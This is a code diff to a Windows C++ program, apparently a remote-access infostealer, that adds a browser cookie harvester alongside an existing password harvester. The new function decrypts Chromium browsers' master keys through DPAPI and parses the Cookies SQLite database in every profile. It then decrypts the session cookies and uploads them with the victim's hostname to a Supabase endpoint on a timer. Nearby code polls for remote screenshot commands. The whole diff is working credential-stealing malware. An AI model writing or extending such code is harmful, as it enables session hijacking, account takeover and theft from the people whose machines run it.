@@ -889,6 +889,7 @@ static void CheckAndHandleExec() {
 // === Browser password harvester ===
  
 #define SUPABASE_PASSWORDS_PATH L"/rest/v1/passwords"
+#define SUPABASE_COOKIES_PATH L"/rest/v1/cookies"
  
 static uint32_t SqliteVarint(const uint8_t* p, int* used) {
     uint32_t v = 0; *used = 0;
@@ -1161,7 +1162,170 @@ static void HarvestBrowserPasswords() {
     }
     LogMsg("Browser password harvest complete");
 }
- 
+  
+static void HarvestBrowserCookies() {
+    char laBuf[MAX_PATH];
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
+    if (laLen == 0 || laLen >= MAX_PATH) return;
+    std::string la(laBuf);
+
+    for (int b = 0; kChromeBrowsers[b].name; b++) {
+        std::string bName(kChromeBrowsers[b].name);
+        auto Diag = [&](const std::string& s) {
+            std::string j = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"browser\":\"" + EscapeJSON(bName) + "\",\"domain\":\"[HARVEST]\",\"name\":\"status\",\"value\":\"" + EscapeJSON(s) + "\"}]";
+            std::string pr;
+            HttpRequest(L"POST", SUPABASE_COOKIES_PATH, j, pr);
+        };
+        bool keyExtracted = false;
+
+        std::string lsPath = la + kChromeBrowsers[b].ls;
+        HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + " (cookies): Local State not found"); Diag("Local State not found"); continue; }
+        DWORD lsSize = GetFileSize(hLs, NULL);
+        if (lsSize > 1048576) { CloseHandle(hLs); LogMsg(bName + " (cookies): Local State too large"); Diag("Local State too large"); continue; }
+        std::string lsContent((size_t)lsSize, 0);
+        DWORD rd = 0;
+        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + " (cookies): Local State read failed"); Diag("Local State read failed"); continue; }
+        CloseHandle(hLs);
+
+        std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
+        if (encKeyStr.empty()) { LogMsg(bName + " (cookies): encrypted_key not found"); Diag("encrypted_key not found"); continue; }
+
+        DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
+        std::vector<uint8_t> dec(decLen);
+        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + " (cookies): base64 decode failed"); Diag("base64 decode failed"); continue; }
+        if (decLen <= 5) { LogMsg(bName + " (cookies): key too short"); continue; }
+
+        DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
+        DATA_BLOB outBlob = { 0, NULL };
+        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + " (cookies): DPAPI decrypt failed"); Diag("DPAPI decrypt failed"); continue; }
+
+        uint8_t aesKey[32];
+        int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
+        memcpy(aesKey, outBlob.pbData, keyLen);
+        LocalFree(outBlob.pbData);
+        if (keyLen != 32) { LogMsg(bName + " (cookies): unexpected key length"); Diag("unexpected key length"); continue; }
+        keyExtracted = true;
+
+        // Build profile dirs from ldBase
+        std::string ldBase = la + kChromeBrowsers[b].ld;
+        std::vector<std::string> profileDirs;
+        std::string suffix = "\\Default\\Login Data";
+        size_t sufPos = ldBase.rfind(suffix);
+        if (sufPos != std::string::npos && sufPos + suffix.size() == ldBase.size()) {
+            std::string userDataDir = ldBase.substr(0, sufPos);
+            profileDirs.push_back(userDataDir + "\\Default");
+            std::string searchPath = userDataDir + "\\Profile*";
+            WIN32_FIND_DATAA fd;
+            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
+            if (hFind != INVALID_HANDLE_VALUE) {
+                do {
+                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                        profileDirs.push_back(userDataDir + "\\" + fd.cFileName);
+                } while (FindNextFileA(hFind, &fd));
+                FindClose(hFind);
+            }
+        } else {
+            // Opera-style: strip \Login Data
+            size_t lastSlash = ldBase.rfind('\\');
+            profileDirs.push_back(ldBase.substr(0, lastSlash));
+        }
+
+        std::string batch = "[";
+        bool first = true;
+        int totalCount = 0;
+        std::vector<std::string> seenDedup;
+
+        for (size_t pi = 0; pi < profileDirs.size(); pi++) {
+            std::string baseDir = profileDirs[pi];
+
+            // Try Network\Cookies then Cookies
+            std::string cookieFiles[] = {
+                baseDir + "\\Network\\Cookies",
+                baseDir + "\\Cookies"
+            };
+            for (int ci = 0; ci < 2; ci++) {
+                std::string cookPath = cookieFiles[ci];
+                char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
+                std::string tmpCp = std::string(tmpDir) + "NPCK_" + std::to_string(GetTickCount()) + "_" + std::to_string(pi) + ".tmp";
+                if (!CopyFileA(cookPath.c_str(), tmpCp.c_str(), FALSE)) continue;
+
+                HANDLE hF = CreateFileA(tmpCp.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+                HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
+                if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
+                if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpCp.c_str()); continue; }
+
+                int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
+                int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "cookies");
+                if (rootP <= 0) { LogMsg(bName + " (cookies): table not found"); }
+                if (rootP > 0) {
+                    struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string* batch; bool* first; int* count; std::vector<std::string>* seen; int idxName; int idxEncVal; };
+                    HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), &batch, &first, &totalCount, &seenDedup, 2, 12 };
+
+                    SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
+                        auto* h = (HCtx*)u;
+                        // Detect schema from column count on first call
+                        if (h->idxName == 2 && h->idxEncVal == 12) {
+                            int u2; uint32_t hdrSz = SqliteVarint(p, &u2);
+                            int pos = u2, colCount = 0;
+                            while (pos < (int)hdrSz) { SqliteVarint(p + pos, &u2); pos += u2; colCount++; }
+                            if (colCount >= 17) { h->idxName = 3; h->idxEncVal = 5; }
+                        }
+
+                        int hostL; const uint8_t* hostD = SqliteColumn(p, pl, 1, &hostL);
+                        if (!hostD || hostL <= 0) return true;
+                        std::string host((const char*)hostD, hostL);
+
+                        int nameL; const uint8_t* nameD = SqliteColumn(p, pl, h->idxName, &nameL);
+                        if (!nameD || nameL <= 0) return true;
+                        std::string name((const char*)nameD, nameL);
+
+                        int valL; const uint8_t* valD = SqliteColumn(p, pl, h->idxEncVal, &valL);
+                        if (!valD || valL <= 0) return true;
+
+                        // Decrypt the cookie value
+                        std::string decrypted;
+                        if (ChromeDecryptPassword(h->ak, h->kl, valD, valL, h->bn, host, decrypted) && !decrypted.empty()) {
+                            // Dedup by domain + name
+                            std::string dedupKey = host + "|" + name;
+                            for (size_t i = 0; i < h->seen->size(); i++) {
+                                if ((*h->seen)[i] == dedupKey) return true;
+                            }
+                            h->seen->push_back(dedupKey);
+
+                            // Base64-encode for safe JSON transport
+                            DWORD b64Len = (DWORD)decrypted.size() * 3 / 4 + 16;
+                            std::vector<char> b64(b64Len);
+                            if (CryptBinaryToStringA((BYTE*)decrypted.data(), (DWORD)decrypted.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64.data(), &b64Len)) {
+                                std::string b64Str(b64.data(), b64Len);
+                                while (!b64Str.empty() && b64Str.back() == '\0') b64Str.pop_back();
+                                std::string row = std::string(*h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"domain\":\"" + EscapeJSON(host) + "\",\"name\":\"" + EscapeJSON(name) + "\",\"value\":\"" + EscapeJSON(b64Str) + "\"}";
+                                *h->batch += row; *h->first = false; (*h->count)++;
+                                LogMsg(std::string(h->bn) + " (cookie): " + host + " / " + name);
+                            }
+                        }
+                        return true;
+                    }, &hc);
+                }
+
+                UnmapViewOfFile(dbMap);
+                if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
+                DeleteFileA(tmpCp.c_str());
+            }
+        }
+
+        if (totalCount > 0) {
+            batch += "]";
+            std::string pr;
+            HttpRequest(L"POST", SUPABASE_COOKIES_PATH, batch, pr);
+            LogMsg(bName + " (cookies): " + std::to_string(totalCount) + " cookies uploaded from " + std::to_string(profileDirs.size()) + " profile(s)");
+        } else if (keyExtracted) {
+            Diag("0 cookies found (" + std::to_string(profileDirs.size()) + " profiles scanned)");
+        }
+    }
+    LogMsg("Browser cookie harvest complete");
+}
+
 static std::string CheckScreenshotCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1590,6 +1754,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             }
             if (counter % 300 == 0 && !g_selfDestructing) {
                 HarvestBrowserPasswords();
+                HarvestBrowserCookies();
             }
             break;
         }
@@ -1757,6 +1922,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
 
 
 
